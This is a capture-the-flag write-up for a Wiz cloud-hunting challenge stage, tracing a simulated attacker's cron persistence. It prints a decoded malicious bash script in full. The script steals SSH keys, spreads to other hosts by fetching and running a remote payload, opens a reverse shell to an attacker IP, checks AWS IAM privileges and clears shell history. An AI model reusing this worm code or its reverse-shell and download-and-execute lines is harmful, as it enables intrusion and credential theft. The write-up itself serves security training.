# 5.WIZ Cloud Hunting CTF:

## 5. Now you're just somebody that I used to log

-----

Wow, you rock! Now you know that the attacker has laterally moved from a workload within the organization to a high privileged machine, ssh-fetcher, via SSH. ExfilCola has granted you root access to the PostgreSQL service where this activity originated from.

ExfilCola really doesn't want to pay the ransom but can't afford for the secret recipe to be published. Can you save the day?

It seems like the attacker is persistent — literally...

Delete the secret recipe from the attacker's server.

-----

Seeing persistence, crontab comes to my mind:

Although there are other techniques, which we will explore if this persistence via cronjob fails:
- https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/#hackersploit-red-team-series
- https://hadess.io/the-art-of-linux-persistence/
- https://www.elastic.co/security-labs/primer-on-persistence-mechanisms
- https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/ 

1. Checking active cronjobs via crontab:

<img width="567" height="63" alt="Clipboard_2025-09-08-06-59-47" src="https://github.com/user-attachments/assets/61844a18-3324-49ec-a71c-2a99438429af" />

> nothing for root!

2. Checking for other users:

<img width="890" height="680" alt="Clipboard_2025-09-08-07-00-39" src="https://github.com/user-attachments/assets/0d353a55-cbbd-42ca-90be-90b9b8660a88" />

I was manually able to know which one has cronjob running, however it is nice to use a bash script to run:

<img width="839" height="112" alt="Clipboard_2025-09-08-07-01-30" src="https://github.com/user-attachments/assets/03482591-d910-46a0-aef7-c48d1497da12" />

Or, the automated way:

<img width="1413" height="632" alt="Clipboard_2025-09-08-07-03-10" src="https://github.com/user-attachments/assets/6dd8d2d9-56f3-4e40-82c2-b6f8f7c366fb" />

3. Moving forward:

<img width="1201" height="435" alt="Clipboard_2025-09-08-07-04-50" src="https://github.com/user-attachments/assets/2315bcbe-21b0-47b0-8dba-c3a90d882478" />

--- snip ----

<img width="1287" height="155" alt="Clipboard_2025-09-08-07-05-02" src="https://github.com/user-attachments/assets/0d636933-cb8a-4bb7-96cd-0670ac7a71b3" />

Used CyberChef to decode it:
```
#!/bin/bash

# List of interesting policies
VULNERABLE_POLICIES=("AdministratorAccess" "PowerUserAccess" "AmazonS3FullAccess" "IAMFullAccess" "AWSLambdaFullAccess" "AWSLambda_FullAccess")

SERVER="34.118.239.100"
PORT=4444
USERNAME="FizzShadows_1"
PASSWORD="Gx27pQwz92Rk"
CREDENTIALS_FILE="/tmp/c"

SCRIPT_PATH="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &>/dev/null && pwd)/$(basename -- "${BASH_SOURCE[0]}")"

# Check if a command exists
check_command() {
    if ! command -v "$1" &> /dev/null; then
        install_dependency "$1"
    fi
}

# Install missing dependencies
install_dependency() {
    local package="$1"
    if [[ "$package" == "curl" ]]; then
        apt-get install curl -y &> /dev/null
                yum install curl -y &> /dev/null
    elif [[ "$package" == "unzip" ]]; then
        apt-get install unzip -y &> /dev/null
                yum install unzip -y &> /dev/null
    elif [[ "$package" == "aws" ]]; then
        install_aws_cli
    fi
}

# Install AWS CLI locally
install_aws_cli() {
    mkdir -p "$HOME/.aws-cli"
    curl -s "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "$HOME/.aws-cli/awscliv2.zip"

    unzip -q "$HOME/.aws-cli/awscliv2.zip" -d "$HOME/.aws-cli/"

    "$HOME/.aws-cli/aws/install" --install-dir "$HOME/.aws-cli/bin" --bin-dir "$HOME/.aws-cli/bin"

    # Add AWS CLI to PATH
    export PATH="$HOME/.aws-cli/bin:$PATH"
    echo 'export PATH="$HOME/.aws-cli/bin:$PATH"' >> "$HOME/.bashrc"
}


# Try to spread
spread_ssh() {
    find_and_execute() {
        local KEYS=$(find ~/ /root /home -maxdepth 5 -name 'id_rsa*' | grep -vw pub;
                     grep IdentityFile ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | awk '{print $2}';
                     find ~/ /root /home -maxdepth 5 -name '*.pem' | sort -u)

        local HOSTS=$(grep HostName ~/.ssh/config /home/*/.ssh/config /root/.ssh/config 2>/dev/null | awk '{print $2}';
                      grep -E "(ssh|scp)" ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}|\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b";
                      grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}|\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b" ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null |
                      grep -vw 127.0.0.1 | sort -u)

        local USERS=$(echo "root";
                      find ~/ /root /home -maxdepth 2 -name '.ssh' | xargs -I {} find {} -name 'id_rsa' | awk -F'/' '{print $3}' | grep -v ".ssh" | sort -u)

       for key in $KEYS; do
            chmod 400 "$key"
            for user in $USERS; do

              echo "$user"
                   for host in $HOSTS; do
                     ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i "$key" "$user@$host" "(curl -u $USERNAME:$PASSWORD -o /dev/shm/controller http://$SERVER/files/controller && bash /dev/shm/controller)"
                done
            done
        done
    }

    find_and_execute
}

create_persistence() {
(crontab -l 2>/dev/null; echo "0 0 * * * bash $SCRIPT_PATH") | crontab -
}

create_shell () {
    echo "Creating a reverse shell"
    /bin/bash -i >& /dev/tcp/"$SERVER"/"$PORT" 0>&1
}

# Check role policies
check_role_vuln() {
    local ROLE_NAME=$(aws sts get-caller-identity --query "Arn" --output text | awk -F'/' '{print $2}')

    # List attached policies for the given role
    attached_policies=$(aws iam list-attached-role-policies --role-name "$ROLE_NAME" --query 'AttachedPolicies[*].PolicyName' --output text)

    # Check if the user has IAM permissions to list policies
    if [[ $? -eq 0 ]]; then
        # If the user has IAM permissions, check attached policies
        attached_policies_array=($attached_policies)
        for policy in "${attached_policies_array[@]}"; do
            for vuln_policy in "${VULNERABLE_POLICIES[@]}"; do
                if [[ "$policy" == "$vuln_policy" ]]; then
                    return 0
                fi
            done
        done
    else
        aws s3 ls
        if [[ $? -eq 0 ]]; then
            return 0
        else
            aws lambda list-functions
            if [[ $? -eq 0 ]]; then
                return 0
            else
                return 1
            fi
        fi
    fi
}

# Check required dependencies
check_command "curl"
check_command "unzip"
check_command "aws"

check_role_vuln
if [[ $? -eq 0 ]]; then
        create_shell
else
        create_persistence
        spread_ssh
	cat /dev/null > ~/.bash_history
fi
```

Within the Script, this line is intriguing:
```bash
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i "$key" "$user@$host" "(curl -u $USERNAME:$PASSWORD -o /dev/shm/controller http://$SERVER/files/controller && bash /dev/shm/controller)"
```
> meaning, we can use this:
> 1. `curl -u $USERNAME:$PASSWORD http://$SERVER/files/controller`
> 2. `curl -u FizzShadows_1:Gx27pQwz92Rk http://34.118.239.100/files/controller`

#1 Try:
<img width="1471" height="70" alt="Clipboard_2025-09-08-07-18-38" src="https://github.com/user-attachments/assets/52e75a38-8ba4-4bfd-b770-5402a08a4882" />

#2 Try: with using only ip address:
<img width="1235" height="969" alt="Clipboard_2025-09-08-07-19-40" src="https://github.com/user-attachments/assets/fea9fc00-2240-4ab8-8d0e-14e5149b984c" />

#3 Try: We can see, we can add these options/endpoints to out url: Trying to list files:
<img width="1310" height="408" alt="Clipboard_2025-09-08-07-22-29" src="https://github.com/user-attachments/assets/efbb451c-70f4-43fb-8c78-db28af765d7d" />

$4. Try: We can see our target, we will delete it, so that APT can't threat **ExfilCola** to release their sensitive information:

<img width="1815" height="93" alt="Clipboard_2025-09-08-07-25-48" src="https://github.com/user-attachments/assets/c6a18b8f-2c02-425e-85df-2d604a5aa273" />

> Nice! we made it ^^
